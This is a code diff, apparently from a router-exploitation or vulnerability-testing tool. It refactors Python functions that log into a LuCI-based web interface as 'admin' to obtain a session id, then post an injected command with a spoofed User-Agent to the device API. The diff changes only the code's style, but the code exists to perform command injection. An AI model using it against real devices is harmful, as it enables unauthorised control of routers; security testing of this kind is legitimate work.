@@ -21,14 +21,11 @@ def eweb_inject_cmd(params):
     injected_cmd = params['wvt']['injected_cmd'].pop(0)
     inject_method = params['wvt']['inject_method'].pop(0)
     p_lock.release()
-    params['http'].__setitem__(
-        'url', 'http://{}{}'.format(params['eweb']['ip'], api))
-    params['http'].__setitem__('params', {'auth': sid})
-    params['http'].__setitem__(
-        'data', {'params': injected_cmd, 'method': inject_method})
-    params['http'].__setitem__(
-        'headers', {'Content-Type': 'application/json', 'User-Agent': get_fake_ua()})
-    params['http'].__setitem__('timeout', 10.0)
+    params['http']['url'] = 'http://{}{}'.format(params['eweb']['ip'], api)
+    params['http']['params'] = {'auth': sid}
+    params['http']['data'] = {'params': injected_cmd, 'method': inject_method}
+    params['http']['headers'] = {'Content-Type': 'application/json', 'User-Agent': get_fake_ua()}
+    params['http']['timeout'] = 10.0
     try:
         params = http_post(params=params)
         if debug:
@@ -59,26 +56,20 @@ def eweb_get_sid(params):
         timestamp = str(get_timestamp_now(is_millisecond=False))
     if 'http' not in params.keys():
         params['http'] = {}
-    params['http'].__setitem__(
-        'url', 'http://{}/cgi-bin/luci/api/auth'.format(params['eweb']['ip']))
-    params['http'].__setitem__('params', {})
-    params['http'].__setitem__(
-        'data', {
-            'params': {
-                'username': 'admin',
-                'encry': True,
-                'password': encrypt_pass(message=params['eweb']['pass']),
-                'time': timestamp
-            }, 'method': 'login'
-        }
-    )
-    params['http'].__setitem__(
-        'headers',
-        {
-            'Content-Type': 'application/json',
-            'User-Agent': get_fake_ua()
-        }
-    )
+    params['http']['url'] = 'http://{}/cgi-bin/luci/api/auth'.format(params['eweb']['ip'])
+    params['http']['params'] = {}
+    params['http']['data'] = {
+        'params': {
+            'username': 'admin',
+            'encry': True,
+            'password': encrypt_pass(message=params['eweb']['pass']),
+            'time': timestamp
+        }, 'method': 'login'
+    }
+    params['http']['headers'] = {
+        'Content-Type': 'application/json',
+        'User-Agent': get_fake_ua()
+    }
     params = http_post(params=params)
     if params['http']['response'] is not int:
         if params['http']['response']['data'] is not None:
@@ -88,7 +79,7 @@ def eweb_get_sid(params):
     else:
         sid = None
     del params['http']['response']
-    params['eweb'].__setitem__('sid', sid)
+    params['eweb']['sid'] = sid
     return params
 
 
